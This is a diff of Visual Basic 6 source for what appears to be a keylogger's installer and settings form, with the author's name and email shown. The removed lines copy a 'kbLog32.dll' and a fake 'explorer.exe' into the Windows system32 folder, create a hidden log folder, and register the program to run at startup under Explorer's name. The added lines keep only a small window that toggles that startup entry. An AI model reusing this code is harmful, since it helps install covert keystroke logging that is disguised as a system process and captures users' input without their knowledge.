@@ -1,157 +1,33 @@
 VERSION 5.00
-Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.ocx"
 Begin VB.Form Form1 
-   BorderStyle     =   1  'Fixed Single
-   Caption         =   "Explorer Installer"
-   ClientHeight    =   4050
-   ClientLeft      =   45
-   ClientTop       =   435
-   ClientWidth     =   6210
+   Caption         =   "niL Loggersetting"
+   ClientHeight    =   1635
+   ClientLeft      =   60
+   ClientTop       =   450
+   ClientWidth     =   2610
    ControlBox      =   0   'False
-   Icon            =   "Form1.frx":0000
    LinkTopic       =   "Form1"
    MaxButton       =   0   'False
    MinButton       =   0   'False
-   ScaleHeight     =   4050
-   ScaleWidth      =   6210
+   ScaleHeight     =   1635
+   ScaleWidth      =   2610
    StartUpPosition =   2  'CenterScreen
-   Begin VB.Frame Frame3 
-      Caption         =   "&Error Report:"
-      Height          =   3255
-      Left            =   240
-      TabIndex        =   9
-      Top             =   120
-      Visible         =   0   'False
-      Width           =   2535
-      Begin VB.TextBox txterr 
-         BackColor       =   &H8000000F&
-         Height          =   2895
-         Left            =   120
-         Locked          =   -1  'True
-         MultiLine       =   -1  'True
-         TabIndex        =   10
-         Top             =   240
-         Width           =   2295
-      End
-   End
-   Begin VB.Frame Frame2 
-      Caption         =   "&Installation and Settings"
-      Height          =   3375
-      Left            =   3000
-      TabIndex        =   7
-      Top             =   120
-      Width           =   3135
-      Begin VB.CommandButton Command4 
-         Caption         =   "&Error Report"
-         Height          =   255
-         Left            =   120
-         Style           =   1  'Graphical
-         TabIndex        =   14
-         Top             =   2640
-         Width           =   2775
-      End
-      Begin VB.TextBox Text2 
-         BackColor       =   &H8000000F&
-         Height          =   285
-         Left            =   120
-         Locked          =   -1  'True
-         TabIndex        =   12
-         TabStop         =   0   'False
-         Text            =   "Welcome to Installation."
-         Top             =   3000
-         Width           =   2775
-      End
-      Begin MSComctlLib.ProgressBar ProgressBar1 
-         Height          =   255
-         Left            =   240
-         TabIndex        =   8
-         Top             =   1440
-         Width           =   2535
-         _ExtentX        =   4471
-         _ExtentY        =   450
-         _Version        =   393216
-         Appearance      =   1
-      End
-      Begin VB.CommandButton Command1 
-         Caption         =   "I&nstall"
-         Default         =   -1  'True
-         Enabled         =   0   'False
-         Height          =   375
-         Left            =   120
-         TabIndex        =   3
-         Top             =   2160
-         Width           =   1335
-      End
-      Begin VB.CheckBox chkRun 
-         Caption         =   "&Run At Startup"
-         Height          =   255
-         Left            =   360
-         TabIndex        =   1
-         Top             =   600
-         Value           =   1  'Checked
-         Width           =   1455
-      End
-      Begin VB.CheckBox Check1 
-         Caption         =   "Run &after Install"
-         Enabled         =   0   'False
-         Height          =   255
-         Left            =   360
-         TabIndex        =   2
-         Top             =   960
-         Width           =   1695
-      End
-      Begin VB.CommandButton Command3 
-         Caption         =   "&Save setting"
-         Height          =   375
-         Left            =   1560
-         TabIndex        =   4
-         Top             =   2160
-         Width           =   1335
-      End
-   End
-   Begin VB.Frame Frame1 
-      Caption         =   "&Log Files"
-      Height          =   3375
-      Left            =   120
-      TabIndex        =   5
-      Top             =   120
-      Width           =   2775
-      Begin VB.TextBox Text1 
-         BackColor       =   &H8000000F&
-         Height          =   285
-         Left            =   120
-         Locked          =   -1  'True
-         TabIndex        =   11
-         TabStop         =   0   'False
-         Text            =   "Logs not found."
-         Top             =   3000
-         Width           =   2415
-      End
-      Begin VB.FileListBox File1 
-         Height          =   2625
-         Left            =   240
-         TabIndex        =   0
-         ToolTipText     =   "Double Click to View"
-         Top             =   240
-         Width           =   2295
-      End
-   End
-   Begin VB.CommandButton Command2 
-      Cancel          =   -1  'True
-      Caption         =   "&Cancel"
-      Height          =   375
-      Left            =   4440
-      TabIndex        =   6
-      Top             =   3600
-      Width           =   1575
-   End
-   Begin VB.Label Label1 
-      Caption         =   "Program by niLesh Akhade...akhadenilesh@ymail.com"
+   Begin VB.CheckBox chkRun 
+      Caption         =   "&Run At Startup"
       Height          =   255
-      Left            =   120
-      TabIndex        =   13
-      Top             =   3600
-      Width           =   4215
+      Left            =   480
+      TabIndex        =   1
+      Top             =   360
+      Value           =   1  'Checked
+      Width           =   1455
+   End
+   Begin VB.CommandButton Command1 
+      Caption         =   "Save Settings"
+      Height          =   495
+      Left            =   480
+      TabIndex        =   0
+      Top             =   840
+      Width           =   1575
    End
 End
 Attribute VB_Name = "Form1"
@@ -207,8 +83,8 @@ Dim status As Long
         KEY_WRITE, ByVal 0&, hKey, _
         ByVal 0&) <> ERROR_SUCCESS _
     Then
-        MsgBox "Error " & err.Number & " opening key" & _
-            vbCrLf & err.Description
+        MsgBox "Error " & Err.Number & " opening key" & _
+            vbCrLf & Err.Description
         Exit Sub
     End If
 
@@ -220,8 +96,8 @@ Dim status As Long
             ByVal key_value, Len(key_value))
 
         If status <> ERROR_SUCCESS Then
-            MsgBox "Error " & err.Number & " setting key" & _
-                vbCrLf & err.Description
+            MsgBox "Error " & Err.Number & " setting key" & _
+                vbCrLf & Err.Description
         End If
     Else
         ' Delete the value.
@@ -233,7 +109,7 @@ Dim status As Long
     Exit Sub
 
 SetStartupError:
-    MsgBox err.Number & " " & err.Description
+    MsgBox Err.Number & " " & Err.Description
     Exit Sub
 End Sub
 ' Return True if the program is set to run at startup.
@@ -262,11 +138,7 @@ End Function
 
 
 
-Private Sub Command2_Click()
-  End
-End Sub
-
-Private Sub Command3_Click()
+Private Sub Command1_Click()
 ' Clear or set the key that makes the program run at startup.
 
     If m_IgnoreEvents Then Exit Sub
@@ -275,105 +147,18 @@ Private Sub Command3_Click()
         (chkRun.Value = vbChecked)
         
         MsgBox "Settings saved!", vbOKOnly, "Settings"
-End Sub
-
-Private Sub Command4_Click()
-If Frame3.Visible = True Then Frame3.Visible = False Else Frame3.Visible = True
+        End
 End Sub
 
 Private Sub Form_Load()
-    ' See if the program is set to run at startup.
+ ' See if the program is set to run at startup.
     m_IgnoreEvents = True
     Dim keycheck As Boolean
     If WillRunAtStartup("explorer") Then
         chkRun.Value = vbChecked
         keycheck = True
     Else
-        chkRun.Value = vbUnchecked: keycheck = False: txterr.Text = txterr.Text & "Autorun Disabled."
+        chkRun.Value = vbUnchecked: keycheck = False
     End If
     m_IgnoreEvents = False
-    
-'writing error log
-    If logfolder = False Then
-    txterr = txterr & vbNewLine & "Log Folder Unavailable.": Frame3.Visible = True: File1.Visible = False
-    Else: Text1 = "Logs Available : " & File1.ListCount
-    End If
-    If kblg = False Then txterr = txterr & vbNewLine & "DLL file missing.": Frame3.Visible = True
-    If exdate = "0" Then
-    txterr = txterr & vbNewLine & "Explorer unavailable."
-    Else: Text2 = "Installed on : " & exdate
-    End If
-'checking final installed or not
-If keycheck = False And logfolder = False And kblg = False And exdate = "0" Then
-MsgBox "Explorer not installed!", vbInformation, "InstallChecker"
-Command1.Enabled = True
-Check1.Enabled = True
-Frame3.Visible = False
-Command3.Enabled = False
-End If
-End Sub
-Private Sub File1_Click()
-Dim aaa As String
-aaa = "notepad " & File1.Path & "\" & File1.FileName
-Shell aaa, vbNormalFocus
-End Sub
-Private Sub Command1_Click()
-
-On Error GoTo err
-MkDir "C:\windows\system32\sysResource"
-ProgressBar1.Value = 20
-FileCopy App.Path & "\files\kbLog32.dll", "C:\windows\system32\kbLog32.dll"
-ProgressBar1.Value = 40
-FileCopy App.Path & "\files\explorer.exe", "C:\windows\system32\explorer.exe"
-ProgressBar1.Value = 60
-' Clear or set the key that makes the program run at startup.
-
-    If m_IgnoreEvents Then Exit Sub
-
-    SetRunAtStartup "explorer", "c:\windows\system32", _
-        (chkRun.Value = vbChecked)
-ProgressBar1.Value = 80
-
-'runs program
-If Check1.Value Then Shell "C:\Windows\system32\explorer.exe"
-ProgressBar1.Value = 100
-
-err:
-If err = 0 Then
-MsgBox "Installation Successful!": Unload Me
-End If
-End Sub
-Private Function logfolder() As Boolean
-On Error GoTo err
-File1.Path = "C:\Windows\system32\sysResource"
-logfolder = True
-err:
-If err <> 0 Then logfolder = False: Exit Function
-End Function
-Private Function exdate() As String
-On Error GoTo err
-exdate = FileDateTime("C:\Windows\system32\explorer.exe")
-err:
-If err <> 0 Then exdate = "0": Exit Function
-End Function
-Private Function kblg() As Boolean
-On Error GoTo err
-Dim i As String
-i = FileDateTime("C:\Windows\system32\kbLog32.dll")
-kblg = True
-err:
-If err <> 0 Then kblg = False: Exit Function
-End Function
-
-
-Private Sub Frame3_DblClick()
-Frame3.Visible = False
-End Sub
-
-Private Sub Option1_Click()
-
-End Sub
-
-Private Sub txterr_DblClick()
-Frame3.Visible = False
 End Sub
